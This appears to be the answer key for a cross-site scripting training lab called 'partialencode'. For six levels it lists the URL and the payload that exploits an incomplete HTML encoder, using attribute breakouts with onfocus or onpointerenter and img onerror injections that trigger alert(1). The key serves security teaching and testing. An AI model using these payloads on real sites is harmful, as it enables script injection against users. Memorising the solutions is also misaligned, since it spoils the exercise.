# partialencode — solutions

Incomplete HTML encoding (one char, first-only, wrong chars) leaving exploitable contexts.

### partialencode-level1

`/partial-encode/level1/?query=%22%20onfocus%3Dalert(1)%20autofocus%20x%3D%22`

- payload: `" onfocus=alert(1) autofocus x="`
- context: only < encoded; <input value="QUERY"> attribute breakout

### partialencode-level2

`/partial-encode/level2/?query=%22%20onpointerenter%3Dalert(1)%20x%3D%22`

- payload: `" onpointerenter=alert(1) x="`
- context: only > encoded; <div title="QUERY"> attribute breakout

### partialencode-level3

`/partial-encode/level3/?query=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: quotes encoded but < > raw; body reflection

### partialencode-level4

`/partial-encode/level4/?query=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: only literal <script>/</script> encoded; other tags raw

### partialencode-level5

`/partial-encode/level5/?query=%3C%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`

- payload: `<><img src=x onerror=alert(1)>`
- context: only first < and first > encoded (sub not gsub)

### partialencode-level6

`/partial-encode/level6/?query=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: & and quotes encoded but < > raw
